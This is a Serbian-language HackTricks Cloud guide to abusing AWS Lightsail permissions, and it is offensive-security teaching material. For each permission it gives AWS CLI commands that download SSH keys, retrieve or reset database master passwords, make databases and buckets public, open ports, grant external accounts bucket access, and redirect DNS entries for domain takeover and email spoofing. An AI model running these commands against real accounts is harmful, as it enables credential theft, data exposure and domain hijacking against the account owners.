# AWS - Lightsail Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Lightsail

Za više informacija o Lightsail-u pogledajte:

{% content-ref url="../aws-services/aws-lightsail-enum.md" %}
[aws-lightsail-enum.md](../aws-services/aws-lightsail-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Važno je napomenuti da Lightsail **ne koristi IAM uloge koje pripadaju korisniku** već AWS upravljanom nalogu, tako da ne možete zloupotrebiti ovu uslugu za privesc. Međutim, **osetljivi podaci** kao što su kod, API ključevi i informacije o bazi podataka mogli bi se naći u ovoj usluzi.
{% endhint %}

### `lightsail:DownloadDefaultKeyPair`

Ova dozvola će vam omogućiti da dobijete SSH ključeve za pristup instancama:
```
aws lightsail download-default-key-pair
```
**Potencijalni uticaj:** Pronađite osetljive informacije unutar instanci.

### `lightsail:GetInstanceAccessDetails`

Ova dozvola će vam omogućiti da generišete SSH ključeve za pristup instancama:
```bash
aws lightsail get-instance-access-details --instance-name <instance_name>
```
**Potencijalni uticaj:** Pronaći osetljive informacije unutar instanci.

### `lightsail:CreateBucketAccessKey`

Ova dozvola će vam omogućiti da dobijete ključ za pristup kanti:
```bash
aws lightsail create-bucket-access-key --bucket-name <name>
```
**Potencijalni uticaj:** Pronađite osetljive informacije unutar kante.

### `lightsail:GetRelationalDatabaseMasterUserPassword`

Ova dozvola će vam omogućiti da dobijete akreditive za pristup bazi podataka:
```bash
aws lightsail get-relational-database-master-user-password --relational-database-name <name>
```
**Potencijalni uticaj:** Pronađite osetljive informacije unutar baze podataka.

### `lightsail:UpdateRelationalDatabase`

Ova dozvola će vam omogućiti da promenite lozinku za pristup bazi podataka:

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --master-user-password <strong_new_password>
```
{% endcode %}

Ako baza podataka nije javna, možete je takođe učiniti javnom sa ovim dozvolama

{% code overflow="wrap" %}
```bash
aws lightsail update-relational-database --relational-database-name <name> --publicly-accessible
```
{% endcode %}

**Potencijalni uticaj:** Pronaći osetljive informacije unutar baze podataka.

### `lightsail:OpenInstancePublicPorts`

Ova dozvola omogućava otvaranje portova za Internet
```bash
aws lightsail open-instance-public-ports \
--instance-name MEAN-2 \
--port-info fromPort=22,protocol=TCP,toPort=22
```
**Potencijalni uticaj:** Pristup osetljivim portovima.

### `lightsail:PutInstancePublicPorts`

Ova dozvola omogućava otvaranje portova za Internet. Imajte na umu da će poziv zatvoriti bilo koji port koji nije naveden.
```bash
aws lightsail put-instance-public-ports \
--instance-name MEAN-2 \
--port-infos fromPort=22,protocol=TCP,toPort=22
```
**Potencijalni uticaj:** Pristup osetljivim portovima.

### `lightsail:SetResourceAccessForBucket`

Ova dozvola omogućava dodeljivanje pristupa instancama za bucket bez dodatnih kredencijala.

{% code overflow="wrap" %}
```bash
aws set-resource-access-for-bucket \
--resource-name <instance-name> \
--bucket-name <bucket-name> \
--access allow
```
{% endcode %}

**Potencijalni uticaj:** Potencijalni novi pristup kanticama sa osetljivim informacijama.

### `lightsail:UpdateBucket`

Sa ovom dozvolom, napadač bi mogao da dodeli svoj AWS nalog pristup za čitanje kanticama ili čak da učini kante javnim za sve:
```bash
# Grant read access to exterenal account
aws update-bucket --bucket-name <value> --readonly-access-accounts <external_account>

# Grant read to the public
aws update-bucket --bucket-name <value> --access-rules getObject=public,allowPublicOverrides=true

# Bucket private but single objects can be public
aws update-bucket --bucket-name <value> --access-rules getObject=private,allowPublicOverrides=true
```
**Potencijalni uticaj:** Potencijalni novi pristup kanticama sa osetljivim informacijama.

### `lightsail:UpdateContainerService`

Sa ovom dozvolom, napadač bi mogao da omogući pristup privatnim ECR-ima iz servisa kontejnera.
```bash
aws update-container-service \
--service-name <name> \
--private-registry-access ecrImagePullerRole={isActive=boolean}
```
**Potencijalni Uticaj:** Dobijanje osetljivih informacija iz privatnog ECR

### `lightsail:CreateDomainEntry`

Napadač sa ovom dozvolom mogao bi da kreira poddomen i usmeri ga na svoju IP adresu (preuzimanje poddomena), ili da napravi SPF zapis koji mu omogućava da lažira e-poštu sa domena, ili čak da postavi glavni domen na svoju IP adresu.
```bash
aws lightsail create-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potencijalni uticaj:** Preuzimanje domena

### `lightsail:UpdateDomainEntry`

Napadač sa ovom dozvolom mogao bi da kreira poddomen i usmeri ga na svoju IP adresu (preuzimanje poddomena), ili da napravi SPF zapis koji mu omogućava da lažira emailove sa domena, ili čak da postavi glavni domen na svoju IP adresu.
```bash
aws lightsail update-domain-entry \
--domain-name example.com \
--domain-entry name=dev.example.com,type=A,target=192.0.2.0
```
**Potencijalni uticaj:** Preuzimanje domena

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
